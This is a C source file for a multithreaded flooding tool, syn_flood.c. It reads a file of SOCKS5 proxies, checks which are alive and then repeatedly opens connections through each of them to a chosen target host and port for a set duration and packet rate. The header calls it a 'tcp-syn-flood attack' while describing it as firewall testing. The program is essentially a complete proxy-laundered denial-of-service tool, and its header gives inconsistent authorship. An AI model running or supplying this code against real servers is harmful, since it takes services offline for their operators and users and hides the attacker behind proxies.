/***********************************************************************
 * syn_flood.c -- Make tcp-syn-flood attack to the server via socks5
 *
 * Copyright (c) 2020, David.H (France)
 *
 * This program is to test the security of the firewall and proxy
 *
 * ---------------------------------------------------------
 * PROJECT:  My Test Program
 * AUTHOR:   Dusko Zivkovic <duskofreelancer@gmail.com>
 * CREATE:   Thu Oct 12, 2020
 * ---------------------------------------------------------
 *
 * Getting Source
 * ==============
 *
 *   Recent version of 'connect.c' is available from
 *     http://www.taiyo.co.jp/~gotoh/ssh/connect.c
 *   With realm for http_auth basic:
 *     http://gist.github.com/360940 
 *
 * How To Compile
 * ==============
 *
 *  On UNIX environment:
 *      $ gcc -g -std=c++11 -Wall syn_flood.c proxy_connect.c  -o syn_flood -lpthread
 *
 * How To Use
 * ==========
 *
 *   You can specify proxy method in an environment variable or in a
 *   command line option.
 *
 *   usage:  syn_flood host port time threads PPS proxy_list file
 *
 * Debugging
 * =========
 *  Use -d -d twice to print a hex encoded stream for both directions and
 *  decode them via 
 *    perl -e'local $/;$_=<>;print chr(hex($_)) for split / /,$_'
 *
 ***********************************************************************/


#include "proxy_connect.h"
#include <pthread.h>
#include <signal.h>
#include <time.h>

#define MAX_PROXY_COUNT     2000
#define PROXY_STATE_DEAD    0x00
#define PROXY_STATE_ALIVE   0x01

/*target server address*/
char* target_host;
unsigned short target_port;
/*thread count to be created*/
int thread_count;
/*attack duartion */
int duration;

/*packets per second*/
int pps;
/* file name of socks5 proxy list*/
char* file_name;

/*socks5 list from the file*/
struct  proxy_info proxy_list[MAX_PROXY_COUNT];
/*proxy state : dead or alive*/
int       proxy_state[MAX_PROXY_COUNT];
/*total proxy count*/
int proxy_count;

/*get all arguments from the input */
int get_arg(int ac, char* av[])
{
	ac --;
	av ++;
	if(ac < 6)
	{
		printf("syn_flood host port time threads PPS proxy\n");
		return -1;
	}
	target_host = *av++;

	target_port = atoi(*av++);
	if(target_port <= 0)
	{
		printf("port is invalid\n");
		return -1;
	}
	duration = atoi(*av++);
	if(duration <= 0)
	{
		printf("duration is invalid\n");
		return -1;
	}
	thread_count = atoi(*av++);
	if(thread_count <= 0)
	{
		printf("thread count is invalid\n");
		return -1;
	}
	pps = atoi(*av++);
	if(pps <= 0)
	{
		printf("pps is invalid\n");
		return 0;
	}
	file_name = *av++;
	return 0;
}

void set_proxy_info(struct proxy_info* info, char* str, int field_index)
{
	if(field_index == 0)
	{
		strcpy(info->ip_addr, str);		
	}
	else if(field_index == 1)
	{
		info->port = atoi(str);
	}
	else if(field_index == 2)
	{
		strcpy(info->user_name, str);
	}
	else if(field_index == 3)
	{
		strcpy(info->password, str);
	}
}

/*read all proxies from the file*/
int read_proxy_file()
{
	FILE* fp = fopen(file_name, "r");
	if(fp == NULL)
	{
		printf("error opening %s\n", file_name);
		return -1;
	}

	proxy_count = 0;
	char buffer[200];
	char sep[10] = " :\r\n";
	while(!feof(fp))
	{
		/*read line*/
		fgets(buffer, 200, fp);
		char *token;

		int field_index = 0;
		/* get the first token */
		token = strtok(buffer, sep);

		/* walk through other tokens */
		while( token != NULL ) 
		{
			//printf( "%s\n", token );
			int len = strlen(token);

			if(len == 0)
			{
				continue;
			}
			set_proxy_info(&proxy_list[proxy_count], token, field_index);
			field_index ++;
			
			token = strtok(NULL, sep);
		}

		//printf(" %d-> %s:%d\n", proxy_count, proxy_list[proxy_count].ip_addr, proxy_list[proxy_count].port);
		proxy_count ++;
		
	}
	return 0;    
}
/*attacking thread process*/
void* attackProc(void* arg)
{
	printf("Thread %d created\n", (unsigned int)arg + 1);
	int time_delay_packet = 1;
	if(pps != -1)
	{
		time_delay_packet = 1000 / pps;
	}
	clock_t begin;
	clock_t end;
	int cur_delay;
	/*while loop*/
	while(1)
	{
		begin = clock();
		/*connect all proxies*/
		for(int i = 0; i < proxy_count;i ++)
		{
			/*try to connect alive proxies*/
			if(proxy_state[i] == PROXY_STATE_ALIVE)
			{
				connect_socks5_proxy(proxy_list + i, target_host, target_port);
			}
		}
		end = clock();
		cur_delay = 1000 *(end - begin) / CLOCKS_PER_SEC;
		/*calculate rest time of one packet duration*/
		if(cur_delay < time_delay_packet)
		{
			usleep(time_delay_packet - cur_delay);
		}
	}
	printf("Thread %d finished\n", (unsigned int)arg + 1);
	return 0;
}
/*thread proc to check if the proxy is alive*/
void* checkProxyProc(void*arg)
{
	int proxy_id = (int)arg;
	proxy_state[proxy_id] = PROXY_STATE_DEAD;
	SOCKET s = open_connect(proxy_list[proxy_id].ip_addr, proxy_list[proxy_id].port);
	if(s != SOCKET_ERROR)
	{	
		//close(s);
		printf("\tProxy(%s:%d) is alive\n", proxy_list[proxy_id].ip_addr, proxy_list[proxy_id].port);
		proxy_state[proxy_id] = PROXY_STATE_ALIVE;
	}
	return 0;
}
/*check all proxies are alive*/
int check_proxies()
{
	printf("Checking Proxy started\n");
	pthread_t thread_list[MAX_PROXY_COUNT];
	
	/*create thread per each proxy*/
	for(int i = 0; i < proxy_count; i ++)
	{
		pthread_create(&thread_list[i], NULL, checkProxyProc, (void*)i);
	}

	clock_t begin = clock();

	int connection_time_out = 10;

	/*wait for all checking thread to be terminatd*/
	while(1)
	{
		int thread_cnt = 0;
		for(int i = 0; i < proxy_count; i ++)
		{
			if(pthread_kill(thread_list[i], 0) == 0)
			{
				thread_cnt ++;
			}
		}
		if(thread_cnt == 0)
		{
			break;
		}
		else
		{
			clock_t current = clock();
			if(current - begin > CLOCKS_PER_SEC * connection_time_out)
			{
				break;
			}
		}
	}

	/*get alive proxy count*/
	int alive_cnt = 0;
	for(int i = 0; i < proxy_count; i ++)
	{
		if(proxy_state[i] == PROXY_STATE_ALIVE)
		{
			alive_cnt++;
		}
	}

	printf("Checking Proxy finished\n");
	printf("Alive Proxy Count: %d\n", alive_cnt);
	return alive_cnt;
}
/*create thread to attack server */
void create_attack_thread()
{
	printf("Total threads : %d\n", thread_count);
	pthread_t thread_id;
	for(int i = 0; i < thread_count; i ++)
	{
		pthread_create(&thread_id, NULL, attackProc, (void*)i);
		usleep(1);
	}
}

/** Main of program **/
int main( int argc, char **argv )
{

	/*get all argument*/
	if(get_arg(argc, argv) == -1)
	{
		return 0;
	}
	/*read all proxies*/
	if(read_proxy_file() == -1)
	{
		return 0;
	}

	printf("Total proxy count: %d\n", proxy_count);

	/*check all proxies are alive*/
	if(check_proxies() == 0)
	{
		printf("Finish Attacking\n");
		return 0;
	}

	/*create thread to attack server*/
	printf("\nAttacking started\n");
	create_attack_thread();

	clock_t begin = clock();
	clock_t current = clock();
	clock_t end = begin + duration * CLOCKS_PER_SEC;
	int prev_time = 0;
	/*wait until the time reached*/
	while(end > current)
	{
		current = clock();
		int cur_time = (current - begin) / CLOCKS_PER_SEC;
		if(cur_time > prev_time)
		{
			printf("------------Passed %3d sec---------\n", cur_time);
		}
		prev_time = cur_time;
	}
	printf("Attacking finished\n");
	return 0;
}